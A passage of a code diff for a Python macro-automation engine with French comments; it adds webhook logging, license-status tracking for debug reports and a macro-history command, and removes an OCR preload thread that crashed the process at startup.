+            resp = urllib.request.urlopen(req, timeout=15 if has_files else 5)
+            _webhook_log.info(
+                f'Webhook "{event}" envoyé — HTTP {resp.status} '
+                f'(screenshot: {"oui" if image_bytes else "non"}, rapport: {"oui" if report_bytes else "non"})'
+            )
 
             # Succès — réinitialiser compteur d'échecs (le slot _webhook_last_sent
             # est déjà réservé avant le lancement du thread, pas besoin de le réécrire)
@@ -644,11 +1144,24 @@ def _cmd_set_webhook(cmd, rid):
     _reply(rid, True, disabled=_webhook_disabled)
 
 def _cmd_set_license_key(cmd, rid):
-    """Poussé par Electron au démarrage — identifie l'install dans les rapports debug."""
-    global _license_key, _app_version
+    """
+    Poussé par Electron au démarrage (clé seule) puis à chaque license:check
+    (clé + statut live) — identifie l'install et son état dans les rapports debug.
+    """
+    global _license_key, _app_version, _license_status
     _license_key = cmd.get('key', '') or ''
     if 'app_version' in cmd:
         _app_version = cmd.get('app_version', '') or ''
+    if 'valid' in cmd:
+        _license_status = {
+            'valid':      bool(cmd.get('valid')),
+            'offline':    bool(cmd.get('offline')),
+            'days_left':  cmd.get('days_left'),
+            # Raison précise renvoyée par LicenseGate (result: VALID/NOT_FOUND/
+            # NOT_ACTIVE/EXPIRED/LICENSE_SCOPE_FAILED/IP_LIMIT_EXCEEDED/
+            # RATE_LIMIT_EXCEEDED) — absente en mode hors-ligne (grace period).
+            'result':     cmd.get('result'),
+        }
     _reply(rid, True)
 
 _WEBHOOK_STATUS_MSG = {
@@ -842,6 +1355,12 @@ def _cmd_get_stats(cmd, rid):
     else:
         _reply(rid, True, stats=state.stats_get_all())
 
+def _cmd_get_macro_history(cmd, rid):
+    """Retourne l'historique persistant des runs terminés (macro_history.json)."""
+    from modules.engine import state
+    limit = int(cmd.get('limit', 100))
+    _reply(rid, True, history=state.history_get(limit))
+
 
 def _cmd_get_variables(cmd, rid):
     """Retourne toutes les variables et compteurs de la session."""
@@ -987,6 +1506,7 @@ _DISPATCH = {
 
     # ── Stats & état global ───────────────────────────────────────────────────
     'get_stats':            _cmd_get_stats,
+    'get_macro_history':    _cmd_get_macro_history,
     'get_variables':        _cmd_get_variables,
     'set_variable':         _cmd_set_variable,
     'set_counter':          _cmd_set_counter,
@@ -1019,23 +1539,17 @@ def _handle(cmd: dict):
         _reply(rid, False, error=f'Unknown command: {c}')
 
 # ── Main loop ─────────────────────────────────────────────────────────────────
-def _prewarm_ocr():
-    """Charge le modèle OCR en arrière-plan pour éviter le gel au premier appel."""
-    try:
-        from modules.engine.ocr_engine import ocr_status, read_text
-        if not ocr_status().get('available'):
-            return
-        import numpy as np
-        read_text(np.zeros((32, 128, 3), dtype=np.uint8))
-        _send({'type': 'log', 'level': 'INFO', 'msg': 'OCR prêt'})
-    except Exception:
-        pass
-
-
 if __name__ == '__main__':
     _init_condition_registry()   # donne aux conditions l'accès aux runners
     threading.Thread(target=_ram_monitor, daemon=True, name='ram-monitor').start()
-    threading.Thread(target=_prewarm_ocr,  daemon=True, name='ocr-prewarm').start()
+    # _prewarm_ocr() retiré : un crash natif (torch quantized RNN, access
+    # violation) dans ce préchargement tue tout le process — pas juste le
+    # thread OCR — puisque ce sont des threads Python dans le même process,
+    # pas des sous-process isolés. Ça tuait le moteur entier (donc aussi le
+    # picker, sans rapport avec l'OCR) ~25s après chaque démarrage sur cette
+    # machine. L'OCR se charge maintenant à la demande (1er appel réel un
+    # peu plus lent, une fois) au lieu de planter systématiquement au
+    # démarrage.
     _send({'type': 'log', 'level': 'INFO', 'msg': 'MacroEngine ready'})
     for raw in sys.stdin:
         raw = raw.strip()
